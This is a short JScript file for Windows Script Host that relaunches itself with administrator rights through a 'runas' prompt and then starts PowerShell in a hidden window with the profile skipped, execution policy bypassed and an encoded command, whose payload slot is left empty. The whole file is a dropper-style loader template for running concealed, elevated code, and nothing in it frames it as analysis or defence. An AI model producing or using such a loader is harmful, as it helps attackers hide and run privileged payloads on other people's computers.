function EnsureElevatedPrivilages() {
    if (!WScript.Arguments.Named.Exists("elevate")) {
        var shellApp = new ActiveXObject("Shell.Application");
        shellApp.ShellExecute(WScript.FullName, "\"" + WScript.ScriptFullName + "\" /elevate", "", "runas", 1);
        WScript.Quit();
    }
}

EnsureElevatedPrivilages();

var WshShell = new ActiveXObject("WScript.Shell");
WshShell.Run("powershell -NoP -Ep Bypass -enc  ", 0, false);

WScript.Quit();
